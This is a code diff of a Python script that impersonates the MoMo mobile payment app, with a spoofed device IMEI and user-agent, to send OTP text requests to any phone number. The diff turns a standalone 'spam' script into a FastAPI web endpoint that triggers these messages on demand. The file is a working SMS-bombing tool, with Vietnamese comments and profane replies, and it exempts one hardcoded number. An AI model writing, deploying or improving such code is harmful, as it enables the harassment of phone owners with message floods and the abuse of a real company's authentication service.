@@ -1,32 +1,16 @@
-import json
-import urllib.request
-import urllib
-import uuid
-import requests
-import hmac
-import hashlib, random ,time
-from fastapi import FastAPI 
-from time import sleep
-sdtspam=input ('Enter Momo : ')
-if sdtspam=="0328774559":
- exit('Cút spam cc')
-def generateRandomString(length = 20) :
-    characters = '0123456789abcdef'
-    charactersLength = len(characters)
-    randomString = ''
-    i = 0
-    while ( i < length ) :
-        randomString += characters[random.randint(0, charactersLength - 1)]
-        i+=1
-    return randomString
-def generateImei() :
-        return str(str(str(str(str(str(str(str(generateRandomString(8)) + '-') + str(generateRandomString(4))) + '-') + str(generateRandomString(4))) + '-') + str(generateRandomString(4))) + '-') + str(generateRandomString(12));  
-def spam(phone=sdtspam):
- import json
+from fastapi import FastAPI #import class FastAPI() từ thư viện fastapi
+import requests,random, json
+app = FastAPI() # gọi constructor và gán vào biến app
+
+
+@app.get("/phone={sdt}")
+async def momo(sdt):
+ if sdt=="0328774559":
+  return "Spam số tao cái lồn à"
+ import json, random, requests 
  time=random.randint(1000000000000,1999999999999)
- url="https://api.momo.vn/backend/otp-app/public/SEND_OTP_MSG"
  data={
-  "user":phone,
+  "user":sdt,
   "msgType": "SEND_OTP_MSG",
   "cmdId": f"{time}000000",
   "lang": "vi",
@@ -42,8 +26,8 @@ def spam(phone=sdtspam):
   "errorDesc": "",
   "momoMsg": {
     "_class": "mservice.backend.entity.msg.RegDeviceMsg",
-    "number": phone,
-    "imei": generateImei(),
+    "number": sdt,
+    "imei": "dd0a83fd-6b7c-c45c-cc8e-8bdf56e6e39f",
     "cname": "Vietnam",
     "ccode": "084",
     "device": "CPH1605",
@@ -71,11 +55,11 @@ def spam(phone=sdtspam):
   
  }
  }
+
  h={
 'Host':'api.momo.vn',
 'msgtype':'SEND_OTP_MSG',
 'user-agent':'okhttp/4.9.0',}
  data = json.dumps(data)
- json=requests.post(url,headers=h,data=data).text
- return json
-spam()
+ t=requests.post("https://api.momo.vn/backend/otp-app/public/SEND_OTP_MSG",headers=h,data=data).text
+ return t
